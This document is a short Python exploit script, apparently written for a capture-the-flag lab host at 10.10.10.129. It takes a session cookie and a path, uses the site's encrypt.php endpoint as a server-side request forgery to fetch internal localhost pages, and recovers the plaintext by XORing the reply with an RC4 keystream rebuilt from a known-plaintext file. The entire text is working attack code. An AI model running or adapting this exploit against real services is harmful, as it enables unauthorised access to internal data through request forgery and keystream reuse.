from base64 import b64decode, b64encode
import itertools
import sys
import requests

totake = sys.argv[2]

def xorString(string, ks):
    ks = ks[:len(string)]
    arr_ord = [ord(a) ^ ord(b) for a,b in zip(string,ks)]
    return [chr(a) for a in arr_ord]

def setKS():
	# Generator fed with a file containing 1 million 'a' chars encrypted 
	with open('ks','r') as file:
    	ks = b64decode(file.read())
	return xorString(ks, 'a'*1000000)


ks = setKS()

sessid = sys.argv[1]
cookie = {'PHPSESSID':sessid}
url = "http://10.10.10.129/encrypt.php?cipher=RC4&url=http://127.0.0.1/{}".format(totake)
#resp = requests.get(url=url, cookies=cookie, proxies={'http':'http://127.0.0.1:8080'})
resp = requests.get(url=url, cookies=cookie)
fetched = resp.text.split('id="output">')[1].split('</textarea>')[0]

print ''.join(xorString(b64decode(fetched), ks))
